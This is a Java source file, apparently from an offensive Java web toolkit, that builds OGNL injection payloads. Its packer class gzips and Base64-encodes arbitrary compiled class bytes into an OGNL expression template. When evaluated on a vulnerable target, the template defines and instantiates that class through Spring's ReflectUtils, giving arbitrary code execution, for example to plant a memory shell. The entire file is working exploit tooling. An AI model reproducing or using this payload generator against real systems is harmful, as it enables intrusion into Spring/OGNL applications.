package com.reajason.javaweb.packer.ognl;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import lombok.SneakyThrows;
import org.apache.commons.codec.binary.Base64;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.zip.GZIPOutputStream;

/**
 * @author ReaJason
 * @since 2025/7/7
 */
public class OGNLSpringIOUtilsGzipPacker implements Packer {
    String template = "@org.springframework.cglib.core.ReflectUtils@defineClass('{{className}}',@org.springframework.util.StreamUtils@copyToByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(@org.springframework.util.Base64Utils@decodeFromString('{{base64Str}}')))),@java.lang.Thread@currentThread().getContextClassLoader(),null,@java.lang.Class@forName('org.springframework.expression.ExpressionParser')).newInstance()";

    @Override
    @SneakyThrows
    public String pack(ClassPackerConfig config) {
        return template.replace("{{className}}", config.getClassName())
                .replace("{{base64Str}}", Base64.encodeBase64String(gzipCompress(config.getClassBytes())));
    }

    public static byte[] gzipCompress(byte[] data) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        try (GZIPOutputStream gzip = new GZIPOutputStream(out)) {
            gzip.write(data);
        }
        return out.toByteArray();
    }
}
